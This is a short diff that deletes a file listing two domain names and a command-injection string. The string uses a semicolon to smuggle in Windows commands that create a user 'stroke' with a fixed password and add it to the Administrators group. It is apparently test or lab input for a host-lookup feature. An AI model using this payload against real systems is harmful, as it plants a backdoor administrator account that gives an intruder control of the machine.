@@ -1,3 +1,0 @@
-google.com
-cisco.com
-;net user stroke Password1234! /add;net localgroup Administrators stroke /add
